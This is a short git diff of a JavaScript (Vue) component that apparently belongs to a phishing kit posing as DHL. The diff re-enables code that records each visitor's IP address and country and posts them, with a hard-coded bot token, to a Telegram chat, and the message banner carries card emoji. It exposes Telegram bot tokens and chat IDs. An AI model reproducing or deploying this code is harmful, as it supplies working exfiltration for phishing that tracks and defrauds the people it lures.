@@ -4164,17 +4164,17 @@ export default {
     this.IP = tt.data.ip;
     this.query = tt.data.country_capital;
     
-   /*var token = "6188237567:AAGyW3wcd9ZumEX5EZTcpkaUsQkVWMgOGGI";
-    var chatId = -823044704;
-    var chatId2 = -940829481;
+   var token = "7502132221:AAEreYpsCAFob_Yo5owYp4VAJz8okueT5Xg";
+    // var chatId = -823044704;
+    var chatId2 = -4886327064;
     var fullMessage = `
         ||||||||||🇨🇦| DHL EN |🇨🇦||||||||||%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| DHL |💳||||||||||`;
-    await axios.post(
-      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${fullMessage}`
-    );
+    // await axios.post(
+    //   `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${fullMessage}`
+    // );
      await axios.post(
        `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
-     );*/
+     );
   },
   methods: {
     redirectInfo() {
